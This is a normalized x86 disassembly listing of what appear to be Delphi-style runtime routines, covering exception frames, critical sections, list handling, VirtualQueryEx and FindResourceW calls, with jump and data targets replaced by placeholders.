mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_423138
mov esi eax
jmp r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_423138
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_448428
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_423208
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_448180
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov esi eax
mov [ ebx + 0xc ] esi
mov eax esi
mov edx edi
call sub_424590
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_423264
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4481a0
mov eax [ esi + 0x4 ]
call sub_4481b0
mov eax [ esi + 0x8 ]
call sub_4481b0
mov eax [ esi + 0xc ]
call sub_4481b0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_4232a4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov esi eax
test esi esi
jl r-xdata
xor eax eax
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov esi eax
test esi esi
jl r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4232f4
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
movzx eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0xc ]
mov edx esi
call sub_4246e8
mov edx eax
mov eax ebp
call sub_448428
test al al
jne r-xdata
sub_423338
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4233de
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_448088
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4232a4
test eax eax
je r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi eax
je r-xdata
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4233e5
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42723c
mov edi eax
mov [ ebx + 0x4 ] edi
mov dl 0x1
mov eax edi
call sub_427028
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x11
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d44
call sub_448c38
sub_4233ec
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_423442
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax edi
call sub_448088
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
test eax eax
setge al
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423449
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_423454
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi eax
test edx edx
je r-xdata
mov eax [ esi + 0xc ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ebp edx
mov edi ebp
call GetCurrentProcess
mov ebx eax
jmp r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x44 ]
push 0x1c
lea eax [ esp + 0x8 ]
push eax
push edi
push ebx
call VirtualQueryEx
cmp eax 0x1c
jne r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov [ esp ] 0x0
mov eax [ esi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
cmp ebp [ esp + 0x8 ]
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_4246e8
mov edx eax
cmp edx ebp
jb r-xdata
add edi [ esp + 0x10 ]
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov eax [ esi + 0xc ]
call sub_4248c0
xor eax eax
jmp r-xdata
cmp edx edi
jb r-xdata
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
cmp eax 0x0
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
cmp eax 0x0
jl r-xdata
mov ebx eax
dec ebx
cmp ebx 0xffffffff
jne r-xdata
xor ecx ecx
mov edx ebx
mov eax [ esi + 0xc ]
call sub_424850
mov [ esp ] 0x1
mov ebx eax
xor eax eax
jmp r-xdata
cmp edx edi
jb r-xdata
xor eax eax
jmp r-xdata
cmp edx edi
jb r-xdata
test al al
je r-xdata
mov al 0x1
test al al
je r-xdata
mov al 0x1
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx ebx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
cmp edx ebp
jb r-xdata
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
cmp edx ebp
jb r-xdata
jmp r-xdata
sub_423594
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax [ edi + 0x20 ]
cmp eax [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ edi + 0x20 ] eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebp ebp
mov eax [ edi + 0x4 ]
mov edx ebp
call sub_4246e8
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_4232f4
mov [ ebx + 0x10 ] al
inc ebp
dec esi
jne r-xdata
sub_4235e0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_448180
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ edi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
call InitializeCriticalSection
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_423208
mov esi eax
mov eax [ edi + 0x4 ]
mov edx esi
call sub_424590
mov [ esi + 0x10 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_423654
push ebx
push esi
push edi
push ebp
call sub_44873c
mov ebx edx
mov ebp eax
lea eax [ ebp + 0x8 ]
push eax
call DeleteCriticalSection
mov eax [ ebp + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x4 ]
call sub_4481b0
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_4481a0
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4486e4
inc esi
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_4246e8
call sub_4481b0
inc edi
dec esi
jne r-xdata
sub_4236b4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor esi esi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_4246e8
mov edx [ esp ]
push edx
mov ecx esi
mov edx eax
mov eax [ r-xdata ]
call sub_423198
mov esi eax
inc edi
dec ebx
jne r-xdata
sub_4236f8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor edi edi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
test edi edi
jne r-xdata
mov edx [ esp ]
call sub_4232a4
mov edi eax
inc esi
dec ebx
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx esi
call sub_4246e8
cmp [ eax + 0x10 ] 0x0
je r-xdata
sub_42373c
push ebp
mov ebp esp
add esp 0xfffffff0
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4237b2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_448088
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x11
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c88
call sub_448c38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4237b9
lea eax [ ebp - 0x10 ]
mov edx 0x2
call j_sub_44936c
retn
sub_4237c0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4236b4
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_42312c
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_42373c
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_4246e8
mov ebx eax
cmp ebx [ ebp - 0x10 ]
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
cmp eax 0x0
jl r-xdata
mov esi eax
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_4236b4
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx [ ebp - 0xc ]
mov eax edi
call sub_448428
test al al
je r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx edi
mov eax [ ebp - 0x10 ]
call sub_423338
sub_4238b8
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
movzx eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4246e8
mov edx ebp
call sub_4233ec
test al al
jne r-xdata
sub_4238fc
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_423208
mov edx eax
mov eax [ edi + 0x4 ]
call sub_424590
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4246e8
mov eax [ eax + 0xc ]
mov edx ebp
call sub_424744
test eax eax
jge r-xdata
sub_423958
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4246e8
mov esi eax
mov edx ebp
mov eax esi
call sub_423454
mov eax [ esi + 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax esi
call sub_4481b0
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4245dc
sub_4239a8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_448180
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ rw-data ]
call sub_423894
xor eax eax
push ebp
push sub_423aa7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_448694
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423aae
mov eax [ rw-data ]
call sub_42394c
retn
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_424590
inc esi
xor edi edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_4246e8
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4232f4
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_424590
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_4246e8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
sub_423aae
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_423ad4
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_4481b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4481a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_423b04
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_423894
xor edx edx
push ebp
push sub_423b7b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_42394c
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
call sub_448d2c
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4246e8
mov edx [ ebp - 0x4 ]
call sub_4232a4
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_423b98
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_423bf8
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0x11
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c88
call sub_448c38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423bff
lea eax [ ebp - 0xc ]
call j_sub_449348
retn
sub_423c04
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_423894
xor eax eax
push ebp
push sub_423c4a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_4236f8
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423c51
mov eax [ rw-data ]
call sub_42394c
retn
sub_423c58
push ebx
push esi
mov esi eax
mov eax esi
call sub_423c04
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_423b98
sub_423c78
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_423894
xor eax eax
push ebp
push sub_423cdd
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4238b8
test al al
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4238a0
cmp ebx [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423ce4
mov eax [ rw-data ]
call sub_42394c
retn
mov eax ebx
call sub_44813c
mov ebx eax
sub_423ce8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_423894
xor eax eax
push ebp
push sub_423d2a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_423958
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423d31
mov eax [ rw-data ]
call sub_42394c
retn
sub_423d34
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_423894
xor eax eax
push ebp
push sub_423d76
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_4238fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423d7d
mov eax [ rw-data ]
call sub_42394c
retn
sub_423d80
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
call sub_423894
xor eax eax
push ebp
push sub_423dc7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ rw-data ]
call sub_4237c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423dce
mov eax [ rw-data ]
call sub_42394c
retn
sub_423dd4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_423894
xor eax eax
push ebp
push sub_423e22
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ rw-data ]
call sub_423594
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423e29
mov eax [ rw-data ]
call sub_42394c
retn
sub_423e94
push ebp
mov ebp esp
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_448694
pop ebp
retn 0x8
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_423ecc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_423e94
mov edx eax
mov eax [ rw-data ]
call sub_424ab8
pop edi
pop esi
pop ebx
retn
sub_423ef8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_424b88
mov esi eax
xor edx edx
push ebp
push sub_423f62
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_424bec
retn
mov edx ebx
mov eax esi
call sub_4246e8
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0xc ]
mov [ ebp - 0x4 ] eax
call sub_448d2c
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_423f74
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_424b88
mov esi eax
xor edx edx
push ebp
push sub_423fde
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_424bec
retn
mov edx ebx
mov eax esi
call sub_4246e8
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_448d2c
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_423ff0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
xor eax eax
inc esi
lea ebx [ ecx + 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebx - 0x4 ]
mov [ edx ] ecx
jmp r-xdata
mov edx edi
mov eax [ ebx ]
call sub_43501c
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_424030
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov [ ebp - 0x5 ] 0x0
inc esi
mov ebx [ ebp - 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax edi
mov edx [ ebx + 0x4 ]
call sub_449d2c
jmp r-xdata
cmp eax [ ebx ]
jne r-xdata
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_424074
push ebx
push esi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov esi ebx
mov edx esi
mov eax [ rw-data ]
call sub_424744
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ rw-data ]
call sub_424590
sub_4240cc
push ebx
push esi
push edi
mov esi eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ebx [ edx + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4246e8
mov edi eax
mov eax esi
call edi
test eax eax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_42410c
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_4240cc
test eax eax
sete al
pop ebx
retn
mov eax ebx
call [ rw-data ]
pop ebx
retn
sub_424130
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
test ebx ebx
jne r-xdata
push 0xa
mov eax edi
call sub_449db8
push eax
push ebx
call FindResourceW
test eax eax
setne al
test al al
je r-xdata
mov ebx [ rw-data ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push edi
push 0xa
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_427ba4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4241a4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_42762c
mov [ esi ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4481b0
retn
sub_4241b4
push ebx
call sub_4015fc
mov ebx [ eax + 0x4 ]
test ebx ebx
jne r-xdata
call sub_4015fc
mov edx [ eax ]
mov eax ebx
call sub_424590
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov ebx eax
call sub_4015fc
mov [ eax ] ebx
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov ebx eax
call sub_4015fc
mov [ eax + 0x4 ] ebx
sub_42420c
push ebx
push esi
push edi
call sub_4015fc
mov edi [ eax ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4246e8
mov edx [ eax ]
call [ edx + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_42423c
push ebx
push esi
call sub_4015fc
mov eax [ eax ]
call sub_4481b0
call sub_4015fc
mov ebx [ eax + 0x4 ]
mov eax ebx
call sub_4247d4
mov esi eax
call sub_4015fc
mov [ eax ] esi
mov edx [ ebx + 0x8 ]
dec edx
mov eax ebx
call sub_4245dc
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
call sub_4015fc
xor edx edx
mov [ eax + 0x4 ] edx
mov eax ebx
call sub_4481b0
sub_424298
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_424314
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp esi [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42431b
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_44813c
call sub_424298
pop ecx
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_448088
mov eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_44b194
call sub_44b1e4
mov edx eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
pop eax
call sub_424130
or bl al
sub_424324
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
